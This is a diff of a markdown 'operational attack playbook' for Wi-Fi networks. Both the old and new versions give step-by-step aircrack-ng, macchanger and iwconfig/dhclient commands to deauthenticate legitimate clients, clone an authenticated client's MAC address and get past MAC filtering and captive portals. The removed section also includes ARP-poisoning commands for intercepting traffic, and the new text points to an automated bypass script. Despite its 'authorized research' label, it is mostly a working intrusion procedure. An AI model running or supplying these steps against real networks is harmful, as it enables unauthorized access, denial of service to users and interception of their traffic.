@@ -1,52 +1,50 @@
-# Operational Attack Playbook: Wi-Fi Bypass & Network Penetration
+# Complete Wi-Fi Bypass & Operational Attack Playbook
 
-Documented technical methodology for authorized research and autonomous simulation.
+Comprehensive operational methodology for authorized research and automated network access simulation.
 
-## 1. Wireless Interface Preparation & Monitor Mode
-To begin packet capture and analysis, the wireless interface must be placed into monitor mode:
+## Overview
+This playbook outlines the exact step-by-step methodologies to bypass wireless access point controls, including MAC filtering and captive portals, through reconnaissance, client emulation, and automated script execution.
+
+---
+
+## Method 1: MAC Whitelist & Captive Portal Bypass (Client Cloning)
+
+### Step 1: Wireless Interface Preparation
+Kill conflicting network manager processes and enable monitor mode to inspect nearby traffic:
 ```bash
-# Check interfering processes
 airmon-ng check kill
-
-# Enable monitor mode on interface (e.g., wlan0)
 airmon-ng start wlan0
-# Resulting monitor interface usually designated as wlan0mon
 ```
 
-## 2. Target Discovery & Station Mapping
-Scan for target networks and identify associated clients:
+### Step 2: Target Station & BSSID Reconnaissance
+Identify active clients associated with the target Access Point:
 ```bash
-# Scan specific channel and BSSID
 airodump-ng --bssid [TARGET_BSSID] --channel [CHANNEL] wlan0mon
 ```
-*Note the active client MAC addresses (`STATION`) communicating with the target Access Point.*
+*Note down a valid, active client MAC address (`STATION`).*
 
-## 3. Deauthentication Attack (Client Disassociation)
-To capture handshakes or force client re-authentication:
+### Step 3: Deauthentication & Disassociation (Optional)
+Force the legitimate client to disconnect, prompting a re-authentication handshake or clearing stale sessions:
 ```bash
-aireplay-ng --deauth 0 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon
+aireplay-ng --deauth 5 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon
 ```
 
-## 4. MAC Spoofing & Identity Cloning
-To bypass MAC address filtering or captive portal whitelists:
+### Step 4: MAC Spoofing / Identity Cloning
+Bring down your local wireless interface, change its MAC address to match the authenticated client, and bring it back up:
 ```bash
-# Bring interface down
 ifconfig wlan0 down
-
-# Change MAC address to match the active authenticated client
-macchanger -m [AUTHENTICATED_CLIENT_MAC] wlan0
-
-# Bring interface back up
+macchanger -m [CLIENT_MAC] wlan0
 ifconfig wlan0 up
 ```
 
-## 5. Session Hijacking & Gateway Interception (ARP Poisoning)
-Once associated with the spoofed MAC:
+### Step 5: Network Association & DHCP Lease
+Connect to the target SSID using the spoofed MAC address and request an IP lease:
 ```bash
-# Enable IP forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# Poison ARP cache between target and gateway
-arpspoof -i wlan0 -t [GATEWAY_IP] [CLIENT_IP]
-arpspoof -i wlan0 -t [CLIENT_IP] [GATEWAY_IP]
+iwconfig wlan0 essid "[TARGET_SSID]"
+dhclient -v wlan0
 ```
+
+---
+
+## Automated Execution (`wifi_auto_bypass.py`)
+Refer to the repository file `wifi_auto_bypass.py` for a fully automated script that handles interface down, MAC spoofing, and DHCP lease request in a single execution.
